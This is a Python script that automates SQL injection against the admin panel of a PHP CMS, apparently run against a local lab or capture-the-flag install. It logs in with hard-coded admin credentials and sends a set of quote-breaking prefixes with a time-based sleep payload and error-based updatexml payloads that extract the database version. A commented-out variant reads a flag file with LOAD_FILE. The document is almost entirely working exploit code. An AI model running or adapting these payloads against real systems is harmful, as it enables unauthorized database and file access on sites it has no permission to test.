import time
from requests_html import HTMLSession
import os

session = HTMLSession()

url = 'http://localhost/admin.php?m=Book&a=reply&id='
# payload = ' or updatexml(1,concat(0x7e,LOAD_FILE("g:/flag"),0x7e),1)'
payload_lst = [
    ' oR iF(sLEEp(1),1,2)',
    ' or updatexml(1,concat(0x7e,version(),0x7e),1)',
]
payload = payload_lst[-1]
words_lst = {
    "1#": "%s#" % payload,
    "1'#": "%s#" % payload,
    "'1'#": "%s#" % payload,
    "1''#": "%s#" % payload,
    '1"#': "%s#" % payload,
    '1""#': "%s#" % payload,
    "1')#": "%s#" % payload,
    "1'))#": "%s#" % payload,
    '1")#': "%s#" % payload,
    '1"))#': "%s#" % payload,
    "''#'": "%s#" % payload,
    "1)": "%s#" % payload.rstrip(")"),  # 1)  对应sql为 SELECT * FROM lmx_book  WHERE uid in($input$)
}


def login():
    # TODO: remove php: session
    burp0_url = "http://localhost/admin.php?m=login&a=login"
    burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                     "Origin": "http://localhost", "Content-Type": "application/x-www-form-urlencoded",
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "Referer": "http://localhost/admin.php?m=Login", "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    burp0_data = {"name": "admin", "pwd": "123456", "sub": "\xe7\x99\xbb\xe5\xbd\x95"}
    res = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(res.text)
    print()
    return session


def my_decorator(func):
    def wrapper(*args, **kwargs):
        """decorator"""
        start_time = time.time()  # 记录开始时间
        func(*args, **kwargs)
        end_time = time.time()  # 记录结束时间
        run_time = end_time - start_time  # 计算运行时间
        f.write(f"<p>\n-- 函数运行时间为 {run_time} 秒\n</p>")

        return wrapper

    return wrapper


@my_decorator
def send_request(param, value):
    # -- test
    # final_url = url + param
    # -- final
    final_url = url + param + value
    f.write(f"\n<p>\n{final_url}\n</p>")
    res = session.get(final_url)
    res.encoding = 'utf8'
    f.write(res.text)


if __name__ == '__main__':
    filename = 'res.html'
    f = open(filename, 'w', encoding='utf8')
    session = login()
    for param, payload_tmp in words_lst.items():
        send_request(param, payload_tmp)

    os.startfile(filename)
